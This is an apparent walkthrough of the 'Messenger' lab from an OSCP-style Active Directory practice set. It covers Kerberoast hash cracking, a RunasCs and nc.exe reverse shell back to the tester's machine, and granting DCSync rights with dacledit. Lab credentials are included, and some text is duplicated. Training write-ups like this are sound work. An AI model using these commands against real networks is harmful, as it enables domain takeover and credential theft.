Messenger

Messenger

Objective

This lab is a hosted version of the OSCP-LK2 set. OSCP-LK2 is a set of machines in the style of the PEN 200 labs and exam to help you sharpen your enumeration, creative thinking and exploitation techniques. The machines were designed to be truly "OSCP like" even more than some machines in OSCP like lists.
This lab is a hosted version of the OSCP-LK2 set. OSCP-LK2 is a set of machines in the style of the PEN 200 labs and exam to help you sharpen your enumeration, creative thinking and exploitation techniques. The machines were designed to be truly "OSCP like" even more than some machines in OSCP like lists.

This is an "assumed breach" lab by HackSmarter. Below are the starting credentials:

Username: kyoma
Password: FutureGadget17

From the output above, the DC has standard ports open. The other two hosts have SMB, RDP, and WinRM open too.

I cracked the password hash of svc_backup user inside the TGS-REP and obtained the password ibm.2000:

┌──(kali㉿kali)-[~/Desktop/Labs/Messenger]
└─$ hashcat -m 13100 out.txt /usr/share/wordlists/rockyou.txt

None of these documents were helpful, as I did not find credentials. I did not find any interesting macros either. However, since I have WRITE privileges -- one of the attack vector is planting macros inside these files and performing command execution when a user opens the document. Another one is perform hash stealing.

Using the RunasCs.exe and nc.exe, I invoked a reverse shell to my machine at port 444 with the credentials of the svc_backup user successfully:

Command used:

.\RunasCs.exe svc_backup@sern.local ibm.2000 "C:\Temp\nc.exe 10.200.115.111 444 -e cmd.exe" --bypass-uac -t 2
.\RunasCs.exe svc_backup@sern.local ibm.2000 "C:\Temp\nc.exe 10.200.115.111 444 -e cmd.exe" --bypass-uac -t 2

As shown in the image above, the svc_backup user has SeBackupPrivilege and SeRestorePrivilge. These privileges can be used to make a copy of the registry hives on the machine to extract credentials. When checking what privileges this user braun has, I notice they have WriteDacl over the sern.local domain:

This means it is possible to assign Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set to obtain DCSync privileges. This is game over.

Firstly, using the WriteDacl privileges, I assigned this braun user the rights to perform DCSync using dacledit:

┌──(kali㉿kali)-[~/Desktop/Labs/Messenger]
└─$ dacledit.py -principal braun -target-dn dc=sern,dc=local -dc-ip 10.0.24.51 sern.local/braun:'ILov3CRTBr4unTube!' -action write -rights DCSync
